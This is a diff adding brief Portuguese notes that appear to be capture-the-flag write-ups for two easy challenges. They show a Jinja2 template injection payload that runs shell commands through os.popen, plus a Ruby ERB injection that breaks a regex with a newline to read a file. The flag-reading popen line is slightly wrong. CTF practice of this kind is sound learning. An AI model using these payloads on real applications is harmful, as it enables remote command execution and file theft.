@@ -1,0 +1,34 @@
+Templated
+EASY
+Exercicio 1 Facil
+Ao testar a aplicação logo se nota que ela esta renderizando as paginais que não existem html
+
+Colocar expressões para ver se está executando codigo
+
+pra retornar tudo 
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+
+para ler a flag
+
+{{config.__class__.__init__.__globals__['os'].popen('flag.txt').read()}}
+
+Diogenes' Rage
+EASY
+Exercicio 2 Facil
+Lendo os arquivos do projeto o ponto mais fragil q eu achei foi o regex, até por ser um 
+arquivo pequeno, além disso a pesquisa estava sendo renderizada no dom.
+
+procurando um jeito de quebrar o regex
+
+vi que quebrando a linha eu poderia executar o que eu quisesse
+
+procurando como executar o ruby dentro de tag html
+<%=%>
+
+procurando como abrir arquivos em ruby
+File.open("flag.txt").read
+
+Encodando pra poder passar <%=%>
+url encode all char
+
+Exercício médio
